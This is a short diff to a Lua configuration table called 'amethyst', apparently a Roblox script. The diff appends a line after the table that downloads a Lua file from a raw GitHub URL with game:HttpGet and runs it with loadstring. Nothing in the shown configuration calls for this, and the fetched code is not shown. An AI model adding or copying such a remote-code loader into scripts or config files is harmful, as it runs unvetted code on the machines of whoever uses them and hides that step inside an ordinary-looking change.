@@ -22,3 +22,5 @@ local amethyst = {
         ['CheckForceField'] = true,
     }
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tingoman/ml/refs/heads/main/ddddddddddddd.lua"))()
